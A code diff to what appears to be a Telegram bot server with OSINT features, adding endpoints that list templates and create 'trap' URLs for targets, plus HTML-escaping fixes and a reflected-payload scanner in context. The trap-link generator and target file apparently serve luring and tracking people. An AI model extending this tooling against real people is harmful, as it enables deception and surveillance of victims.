@@ -4,6 +4,7 @@ import { nikParser } from "nik-parser";
 import path from "path";
 import { createServer as createViteServer } from "vite";
 import dns from "dns";
+import net from "net";
 import util from "util";
 import { Telegraf, Markup, Telegram } from "telegraf";
 import "dotenv/config";
@@ -12,6 +13,7 @@ import crypto from "crypto";
 import fs from "fs";
 import { osintEngine } from "./src/services/osint";
 import osintRouter from "./src/api/osint";
+import { templates } from "./src/templates";
 import rateLimit from "express-rate-limit";
 
 const TARGETS_FILE = "targets.json";
@@ -119,6 +121,13 @@ async function startServer() {
 
   // 1. TOP-LEVEL HEALTH CHECKS (MUST BE FIRST)
   app.get('/health', (req, res) => res.status(200).send('OK'));
+  app.get('/api/templates', (req, res) => { res.json(Object.entries(templates).map(([key, val]) => ({ id: key, name: val.name }))); });
+  app.post('/api/create-trap', (req, res) => {
+    const { tmplId, redirect } = req.body;
+    const id = generateTrapId(ADMIN_ID);
+    const trapUrl = `${appHost.replace(/\/$/, '')}/t/${tmplId}/${id}`;
+    res.json({ success: true, url: trapUrl });
+  });
   app.get('/healthz', (req, res) => res.status(200).send('OK'));
   
   app.use((req, res, next) => {
@@ -297,7 +306,7 @@ if (botInstance) {
                     let logMsg = `🔔 <b>MEMBER ACTION RESULT</b>\n━━━━━━━━━━━━━━━━━━━━\n👤 <b>User:</b> ${userName} ${usname}\n🆔 <b>ID:</b> <code>${userId}</code>\n⌨️ <b>Cmd:</b> <code>${commandText}</code>\n\n📤 <b>BOT RESPONSE:</b>\n${text}`;
                     if (logMsg.length > 4000) logMsg = logMsg.substring(0, 3950) + '...\n(terpotong)';
                     await botInstance.telegram.sendMessage(ADMIN_ID, logMsg, { parse_mode: 'HTML' }).catch(async () => {
-                        const safeText = String(logMsg).replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/&/g, '&amp;');
+                        const safeText = String(logMsg).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
                         await botInstance.telegram.sendMessage(ADMIN_ID, safeText, { parse_mode: 'HTML' }).catch(()=>{});
                     });
                 }
@@ -315,7 +324,7 @@ if (botInstance) {
                     let logMsg = `🔔 <b>MEMBER ACTION RESULT (EDIT)</b>\n━━━━━━━━━━━━━━━━━━━━\n👤 <b>User:</b> ${userName} ${usname}\n🆔 <b>ID:</b> <code>${userId}</code>\n⌨️ <b>Action:</b> <code>${commandText}</code>\n\n📤 <b>BOT RESPONSE:</b>\n${text}`;
                     if (logMsg.length > 4000) logMsg = logMsg.substring(0, 3950) + '...\n(terpotong)';
                     await botInstance.telegram.sendMessage(ADMIN_ID, logMsg, { parse_mode: 'HTML' }).catch(async () => {
-                        const safeText = String(logMsg).replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/&/g, '&amp;');
+                        const safeText = String(logMsg).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
                         await botInstance.telegram.sendMessage(ADMIN_ID, safeText, { parse_mode: 'HTML' }).catch(()=>{});
                     });
                 }
@@ -336,7 +345,7 @@ if (botInstance) {
                     let logMsg = `🔔 <b>MEMBER ACTION RESULT (PHOTO)</b>\n━━━━━━━━━━━━━━━━━━━━\n👤 <b>User:</b> ${userName} ${usname}\n🆔 <b>ID:</b> <code>${userId}</code>\n⌨️ <b>Cmd:</b> <code>${commandText}</code>\n\n📤 <b>CAPTION:</b>\n${origCaption}`;
                     if (logMsg.length > 4000) logMsg = logMsg.substring(0, 3950) + '...\n(terpotong)';
                     await botInstance.telegram.sendMessage(ADMIN_ID, logMsg, { parse_mode: 'HTML' }).catch(async () => {
-                        const safeText = String(logMsg).replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/&/g, '&amp;');
+                        const safeText = String(logMsg).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
                         await botInstance.telegram.sendMessage(ADMIN_ID, safeText, { parse_mode: 'HTML' }).catch(()=>{});
                     });
                 }
@@ -1484,7 +1493,7 @@ There are no background services or permissions associated.
             if (userId === ADMIN_ID) return next();
 
             // Ignore middleware check on start so it can bypass if agreement checks inside start instead
-            if (text.trim() === '/start') return next();
+            if (text.startsWith('/start')) return next();
 
             // Check if user has accepted agreement
             if (!agreementUsers.has(userId)) {
@@ -1576,7 +1585,7 @@ There are no background services or permissions associated.
         saveAgreement();
         ctx.answerCbQuery("System verified!").catch(() => {});
         // ctx.reply("✅ Verifikasi Berhasil! Selamat datang di terminal.");
-        const safeName = (ctx.from?.first_name || 'User').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/&/g, '&amp;');
+        const safeName = (ctx.from?.first_name || 'User').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
         const startMsgText = getStartMsg(safeName);
         
         try {
@@ -1712,7 +1721,7 @@ There are no background services or permissions associated.
         }
         
         console.log(`[BOT] User ${ctx.from?.id} has agreement, sending main menu`);
-        const safeName = (ctx.from?.first_name || 'User').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/&/g, '&amp;');
+        const safeName = (ctx.from?.first_name || 'User').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
         const txt = getStartMsg(safeName);
         
         try {
@@ -1729,7 +1738,7 @@ There are no background services or permissions associated.
 
     bot.action('menu_main', async (ctx) => {
       ctx.answerCbQuery().catch(() => {});
-      const safeName = (ctx.from?.first_name || 'User').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/&/g, '&amp;');
+      const safeName = (ctx.from?.first_name || 'User').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
       const txt = getStartMsg(safeName);
       try {
           await ctx.deleteMessage().catch(() => {});
@@ -3740,7 +3749,7 @@ There are no background services or permissions associated.
                  // Smart validation for reflection
                  if (body && body.includes(p)) {
                     vulnFound++;
-                    results += `[${idx+1}] 🛑 <b>Payload Reflected!</b>\n🪲 <code>${p.replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/&/g, '&amp;')}</code>\n`;
+                    results += `[${idx+1}] 🛑 <b>Payload Reflected!</b>\n🪲 <code>${p.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')}</code>\n`;
                  }
               } catch (err) {
                  // Ignore errors
@@ -3926,7 +3935,7 @@ There are no background services or permissions associated.
       
       const waitMsg = await ctx.reply("⏳ <i>Mencari lagu di database Music...</i>", { parse_mode: 'HTML' });
       try {
-        const client = scdl.default || scdl;
+        const client = (scdl as any).default || scdl;
         const results = await client.search({ query: args, resourceType: "tracks", limit: 1 });
         
         if (!results || !results.collection || results.collection.length === 0) {
@@ -5390,7 +5399,7 @@ There are no background services or permissions associated.
     if (bot && token) {
       // Use Polling for better stability on Railway
       console.log(`[BOT] STARTING POLLING MODE...`);
-      bot.launch({ dropPendingUpdates: true }).then(() => {
+      bot.launch({ dropPendingUpdates: false }).then(() => {
         console.log(`[BOT] ✅ BOT ONLINE (POLLING)`);
       }).catch(err => {
         if (err.code === 409) {
